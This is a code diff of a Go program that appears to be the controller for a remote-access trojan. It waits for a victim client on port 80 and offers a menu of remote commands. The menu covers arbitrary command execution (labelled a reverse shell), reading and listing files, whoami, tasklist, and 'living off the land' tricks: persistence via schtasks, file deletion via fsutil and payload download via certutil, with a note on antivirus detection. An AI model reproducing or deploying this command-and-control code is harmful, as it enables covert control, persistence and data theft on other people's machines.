@@ -6,8 +6,8 @@ import("strings")
 import("time")
 import("os")
 func main () {
+	bobscanner := bufio.NewScanner(os.Stdin)
 	fmt.Print("Waiting for client to connect...\n") // make connection
-	file := "h-server-file"
 	option := "h-server-options"
 	connection, errer := net.Listen("tcp", ":80")
 	if (errer != nil) {
@@ -21,14 +21,18 @@ func main () {
 	}
 	fmt.Print("Connection made!\n") // end make connection
 	for { // for loop that breaks when server exists
-		fmt.Print("\n\nOptions:\n0. Help\n1. Exit Server\n2. Exit Server And Client\n3. Read File\n4. List Files\n5. LOLBas module (Maintain access, file delete, and file upload)\n6. Whoami\n7. Tasklist (warning: executes tasklist.exe)\n8. Execute command: ")
+		fmt.Print("\n\nOptions:\n0. Help\n1. Exit Server\n2. Exit Server And Client\n3. cat\n4. ls\n5. LOLBas module (Maintain access, file delete, and file upload)\n6. Whoami\n7. Tasklist (warning: executes tasklist.exe)\n8. Execute command\n9. pwd: ")
 		fmt.Scanln(&option)
+		if (option == "9") {
+			fmt.Fprintf(connectwo, "b\n")
+			out,_ := bufio.NewReader(connectwo).ReadString('\n')
+			fmt.Print(out)
+		}
 		if (option == "8") { // reverse shell
 			fmt.Fprintf(connectwo, "a\n")
 			fmt.Print("Command: ")
-			scanner := bufio.NewScanner(os.Stdin)
-			scanner.Scan()
-			cmd := scanner.Text()
+			bobscanner.Scan()
+			cmd := bobscanner.Text()
 			fmt.Fprintf(connectwo, cmd + "\n")
 			out,_ := bufio.NewReader(connectwo).ReadString('\n')
 			out = strings.Replace(out, "COMMANDSAREFUN", "\n", -1)
@@ -46,7 +50,7 @@ func main () {
 			fmt.Print(out)
 		}
 		if (option == "5") { //LOLBas 
-			fmt.Print("\n\nWarning: these all execute cmd.exe\n0. Go back\n1. maintain access via schtasks\n2. Delete file via fsutil\n3. File download via certutil: ")
+			fmt.Print("\n\nWarning: these all execute programs which can be detected by anti viruses\n0. Go back\n1. maintain access via schtasks\n2. Delete file via fsutil\n3. File download via certutil: ")
 			choice := "02"
 			fmt.Scanln(&choice)
 			if (choice == "1") { //schtasks maintain access
@@ -57,8 +61,8 @@ func main () {
 			}
 			if (choice == "2") { // delete file fsutil
 				fmt.Print("File to delete: ")
-				choicer := "string"
-				fmt.Scanln(&choicer)
+				bobscanner.Scan()
+				choicer := bobscanner.Text()
 				fmt.Fprintf(connectwo, "6\n")
 				fmt.Fprintf(connectwo, choicer + "\n")
 				fmt.Print("Command sent\nOutput:")
@@ -67,15 +71,11 @@ func main () {
 			}
 			if (choice == "3") { // file download certutil
 				fmt.Print("File URL: ")
-				choicer := "string"
-				fmt.Scanln(&choicer)
-				filename := "string"
-				time.Sleep(time.Second)
+				bobscanner.Scan()
+				choicer := bobscanner.Text()
 				fmt.Fprintf(connectwo, "7\n")
 				time.Sleep(time.Second)
 				fmt.Fprintf(connectwo, choicer + "\n")
-				time.Sleep(time.Second)
-				fmt.Fprintf(connectwo, filename + "\n")
 				out,_ := bufio.NewReader(connectwo).ReadString('\n')
 				time.Sleep(time.Second * 5)
 				fmt.Print("Command sent\n",out)
@@ -102,8 +102,8 @@ func main () {
 		if (option == "4") { // ls/dir
 			fmt.Fprintf(connectwo, "4\n")
 			fmt.Print("Dir to read: ")
-			aaa := "/"
-			fmt.Scanln(&aaa)
+			bobscanner.Scan()
+			aaa := bobscanner.Text()
 			fmt.Fprintf(connectwo, aaa + "\n")
 			for {
 				stuff2, err := bufio.NewReader(connectwo).ReadString('\n')
@@ -124,7 +124,8 @@ func main () {
 		if (option == "3") { //cat
 			fmt.Fprintf(connectwo, "1\n")
 			fmt.Print("File to read: ")
-			fmt.Scanln(&file)
+			bobscanner.Scan()
+			file := bobscanner.Text()
 			fmt.Fprintf(connectwo, file + "\n")
 			for {
 				stuff, er := bufio.NewReader(connectwo).ReadString('\n')
